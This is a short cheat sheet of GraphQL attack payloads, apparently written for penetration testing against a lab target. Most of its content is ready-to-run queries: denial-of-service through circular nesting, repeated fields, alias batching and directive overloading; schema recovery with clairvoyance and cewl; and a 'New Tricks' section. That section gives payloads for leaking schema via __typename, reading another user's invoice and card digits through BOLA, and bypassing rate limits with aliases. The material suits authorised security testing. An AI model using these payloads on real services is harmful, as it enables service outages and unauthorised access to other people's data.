
1- look for circular relations in order to DOS the server 
```
query{post{owner{post{owner{post{owner{post{owe}}}}}}}}
```


2- look for repeatable fields 
```
    pastes {
        content
        content
        content
        content
        content
        content
        content
        content
        content
        content
    }
}
```

3- look for heavy query and try to repeat it with aliases
```
query {
    one:systemUpdate
    two:systemUpdate
    three:systemUpdate
    four:systemUpdate
}
```
4- test for directive overloading ( supply any non-existant directive and repeat it)
```
query {
    pastes{title @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@aa@}}
```

5- in case of disabled introspection, you can use clairvoyance to get the fields and objects, ( you can either use the WL in Seclists or create one using cewl )
--provide clairvoyance with graphql endpoint--
`clairvoyance http://example.com/graphql -w wordlist.txt -o output.json`
provide cewl with the domain and the output 
`cewl http://192.168.1.112:5013 -w wordlist.txt`

## New Tricks

### Trick 1
- Scenario: Introspection disabled, but __typename still leaked sensitive schema paths.
- Payload: `{ user(id:1){__typename,roles,email} }`

### Trick 2
- Scenario: BOLA bypass by changing object ID in nested resolver.
- Payload: `query{invoice(id:"1024"){ownerId,total,cardLast4}}`

### Trick 3
- Scenario: Rate-limit bypassed by aliases hitting same expensive resolver.
- Payload: `query{a:user(id:1){id} b:user(id:1){id} c:user(id:1){id}}`
